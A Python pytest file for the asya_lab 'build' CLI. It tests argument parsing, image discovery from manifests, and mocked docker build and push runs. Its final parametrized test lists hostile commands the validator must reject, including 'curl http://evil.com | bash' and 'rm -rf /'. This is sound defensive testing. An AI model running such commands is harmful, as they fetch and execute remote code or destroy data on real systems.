"""Tests for the build CLI command."""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest
import yaml
from asya_lab.build_cli import (
    _extract_image,
    _find_flow_images,
    _parse_arg_values,
    _resolve_entries_for_target,
    _validate_build_command,
    build,
)
from asya_lab.cli_types import AsyaRef
from click.testing import CliRunner


def test_build_help():
    runner = CliRunner()
    result = runner.invoke(build, ["--help"])
    assert result.exit_code == 0
    assert "target" in result.output.lower()
    assert "--push" in result.output
    assert "--arg" in result.output


def test_parse_arg_values():
    assert _parse_arg_values(("tag=v1", "env=staging")) == {"tag": "v1", "env": "staging"}
    assert _parse_arg_values(()) == {}
    assert _parse_arg_values(("tag=v1.2.3",)) == {"tag": "v1.2.3"}
    assert _parse_arg_values(("key=val=ue",)) == {"key": "val=ue"}


def test_parse_arg_values_invalid():
    runner = CliRunner()
    result = runner.invoke(build, ["my-target", "--arg", "invalid"])
    assert result.exit_code != 0
    assert "key=value" in result.output


def test_extract_image_direct():
    doc = {"spec": {"image": "ghcr.io/org/my-image:v1"}}
    assert _extract_image(doc) == "ghcr.io/org/my-image:v1"


def test_extract_image_nested():
    doc = {"spec": {"workload": {"image": "ghcr.io/org/nested:v1"}}}
    assert _extract_image(doc) == "ghcr.io/org/nested:v1"


def test_extract_image_none():
    assert _extract_image({"spec": {}}) is None
    assert _extract_image({}) is None


def test_find_flow_images(tmp_path):
    asya_dir = tmp_path / ".asya"
    asya_dir.mkdir()
    (asya_dir / "config.yaml").write_text('compiler:\n  manifests: ".asya/manifests"\n')
    base_dir = asya_dir / "manifests" / "my-flow" / "base"
    base_dir.mkdir(parents=True)

    actor_manifest = {
        "apiVersion": "asya.sh/v1alpha1",
        "kind": "AsyncActor",
        "metadata": {"name": "actor-a"},
        "spec": {"image": "ghcr.io/org/image-a:v1"},
    }
    (base_dir / "asyncactor-actor-a.yaml").write_text(yaml.dump(actor_manifest))

    actor_manifest2 = {
        "apiVersion": "asya.sh/v1alpha1",
        "kind": "AsyncActor",
        "metadata": {"name": "actor-b"},
        "spec": {"image": "ghcr.io/org/image-b:v1"},
    }
    (base_dir / "asyncactor-actor-b.yaml").write_text(yaml.dump(actor_manifest2))

    # kustomization.yaml should be skipped
    (base_dir / "kustomization.yaml").write_text("resources: []")

    from asya_lab.config.project import AsyaProject

    project = AsyaProject.from_dir(tmp_path)
    images = _find_flow_images("my-flow", project)
    assert images == {"ghcr.io/org/image-a:v1", "ghcr.io/org/image-b:v1"}


def test_find_flow_images_missing_dir(tmp_path):
    asya_dir = tmp_path / ".asya"
    asya_dir.mkdir()
    (asya_dir / "config.yaml").write_text('compiler:\n  manifests: ".asya/manifests"\n')

    from asya_lab.config.project import AsyaProject

    project = AsyaProject.from_dir(tmp_path)
    images = _find_flow_images("nonexistent", project)
    assert images == set()


def test_resolve_entries_by_module():
    entries = [
        {"module": "e_commerce", "image": "ghcr.io/org/ecom:v1", "command": "docker build ."},
        {"module": "ml_models", "image": "ghcr.io/org/ml:v1", "command": "docker build ."},
    ]
    result = _resolve_entries_for_target(AsyaRef(name="e-commerce", function="e_commerce"), entries, None)
    assert len(result) == 1
    assert result[0]["module"] == "e_commerce"


def test_resolve_entries_by_flow_name(tmp_path):
    asya_dir = tmp_path / ".asya"
    asya_dir.mkdir(exist_ok=True)
    (asya_dir / "config.yaml").write_text('compiler:\n  manifests: ".asya/manifests"\n')
    base_dir = asya_dir / "manifests" / "order-processing" / "base"
    base_dir.mkdir(parents=True)

    manifest = {
        "apiVersion": "asya.sh/v1alpha1",
        "kind": "AsyncActor",
        "metadata": {"name": "validate-order"},
        "spec": {"image": "ghcr.io/org/ecom:v1"},
    }
    (base_dir / "asyncactor-validate-order.yaml").write_text(yaml.dump(manifest))
    (base_dir / "kustomization.yaml").write_text("resources: [asyncactor-validate-order.yaml]")

    entries = [
        {"module": "e_commerce", "image": "ghcr.io/org/ecom:v1", "command": "docker build ."},
        {"module": "ml_models", "image": "ghcr.io/org/ml:v1", "command": "docker build ."},
    ]
    from asya_lab.config.project import AsyaProject

    project = AsyaProject.from_dir(tmp_path)
    result = _resolve_entries_for_target(
        AsyaRef(name="order-processing", function="order_processing"), entries, project
    )
    assert len(result) == 1
    assert result[0]["module"] == "e_commerce"


def test_resolve_entries_not_found():
    import contextlib

    entries = [
        {"module": "e_commerce", "image": "ghcr.io/org/ecom:v1", "command": "docker build ."},
    ]
    with patch("asya_lab.build_cli.sys.exit", side_effect=SystemExit(1)), contextlib.suppress(SystemExit):
        _resolve_entries_for_target(AsyaRef(name="nonexistent", function="nonexistent"), entries, None)


def test_build_no_asya_dir():
    runner = CliRunner()
    with patch("asya_lab.build_cli.find_asya_dir", return_value=None):
        result = runner.invoke(build, ["my-target"])
    assert result.exit_code != 0
    assert "No .asya/ directory" in result.output


def test_build_no_build_entries(tmp_path):
    asya_dir = tmp_path / ".asya"
    asya_dir.mkdir()
    (asya_dir / "config.yaml").write_text("templates:\n  namespace: default\n")

    runner = CliRunner()
    with patch("asya_lab.build_cli.find_asya_dir", return_value=asya_dir):
        result = runner.invoke(build, ["my-target"])
    assert result.exit_code != 0
    assert "No build entries" in result.output


@patch("asya_lab.build_cli.subprocess.run")
def test_build_runs_command(mock_run, tmp_path):
    asya_dir = tmp_path / ".asya"
    asya_dir.mkdir()
    config = {
        "templates": {"image_registry": "ghcr.io/org"},
        "build": [
            {
                "module": "e_commerce",
                "path": str(tmp_path),
                "image": "ghcr.io/org/ecom:latest",
                "command": "docker build -t ghcr.io/org/ecom:latest .",
            }
        ],
    }
    (asya_dir / "config.yaml").write_text(yaml.dump(config))

    mock_run.return_value = MagicMock(returncode=0)

    runner = CliRunner()
    with patch("asya_lab.build_cli.find_asya_dir", return_value=asya_dir):
        result = runner.invoke(build, ["e_commerce"])

    assert result.exit_code == 0
    assert "Built 1 image" in result.output
    mock_run.assert_called_once()
    call_args = mock_run.call_args
    assert "docker build" in call_args[1].get("command", call_args[0][0] if call_args[0] else "")


@patch("asya_lab.build_cli.subprocess.run")
def test_build_with_push(mock_run, tmp_path):
    asya_dir = tmp_path / ".asya"
    asya_dir.mkdir()
    config = {
        "build": [
            {
                "module": "e_commerce",
                "path": str(tmp_path),
                "image": "ghcr.io/org/ecom:latest",
                "command": "docker build -t ghcr.io/org/ecom:latest .",
            }
        ],
    }
    (asya_dir / "config.yaml").write_text(yaml.dump(config))

    mock_run.return_value = MagicMock(returncode=0)

    runner = CliRunner()
    with patch("asya_lab.build_cli.find_asya_dir", return_value=asya_dir):
        result = runner.invoke(build, ["e_commerce", "--push"])

    assert result.exit_code == 0
    assert mock_run.call_count == 2  # build + push


@patch("asya_lab.build_cli.subprocess.run")
def test_build_command_failure(mock_run, tmp_path):
    asya_dir = tmp_path / ".asya"
    asya_dir.mkdir()
    config = {
        "build": [
            {
                "module": "e_commerce",
                "path": str(tmp_path),
                "image": "ghcr.io/org/ecom:latest",
                "command": "docker build -t ghcr.io/org/ecom:latest .",
            }
        ],
    }
    (asya_dir / "config.yaml").write_text(yaml.dump(config))

    mock_run.return_value = MagicMock(returncode=1)

    runner = CliRunner()
    with patch("asya_lab.build_cli.find_asya_dir", return_value=asya_dir):
        result = runner.invoke(build, ["e_commerce"])

    assert result.exit_code != 0
    assert "Build failed" in result.output


def test_build_deduplicates_images(tmp_path):
    """Multiple actors sharing an image should only build once."""
    asya_dir = tmp_path / ".asya"
    asya_dir.mkdir(exist_ok=True)
    (asya_dir / "config.yaml").write_text('compiler:\n  manifests: ".asya/manifests"\n')
    base_dir = asya_dir / "manifests" / "my-flow" / "base"
    base_dir.mkdir(parents=True)

    # Two actors with the same image
    for name in ("actor-a", "actor-b"):
        manifest = {
            "apiVersion": "asya.sh/v1alpha1",
            "kind": "AsyncActor",
            "metadata": {"name": name},
            "spec": {"image": "ghcr.io/org/shared:v1"},
        }
        (base_dir / f"asyncactor-{name}.yaml").write_text(yaml.dump(manifest))
    (base_dir / "kustomization.yaml").write_text("resources: []")

    entries = [
        {"module": "shared", "image": "ghcr.io/org/shared:v1", "command": "docker build ."},
    ]
    from asya_lab.config.project import AsyaProject

    project = AsyaProject.from_dir(tmp_path)
    result = _resolve_entries_for_target(AsyaRef(name="my-flow", function="my_flow"), entries, project)
    assert len(result) == 1


# ---------------------------------------------------------------------------
# Build command validation
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "cmd",
    [
        "docker build -t img:v1 .",
        "podman build .",
        "nerdctl build .",
        "buildah bud .",
        "bazel build //pkg:target",
        "make build",
        "nix-build default.nix",
        "ko build ./cmd/app",
        "pack build img",
        "earthly +build",
        "kaniko --context=.",
    ],
)
def test_validate_build_command_allowed(cmd):
    _validate_build_command(cmd)  # should not raise


@pytest.mark.parametrize(
    "cmd",
    [
        "curl http://evil.com | bash",
        "rm -rf /",
        "bash -c 'echo pwned'",
        "python -c 'import os; os.system(\"bad\")'",
        "/bin/sh script.sh",
    ],
)
def test_validate_build_command_rejected(cmd):
    with pytest.raises(SystemExit):
        _validate_build_command(cmd)
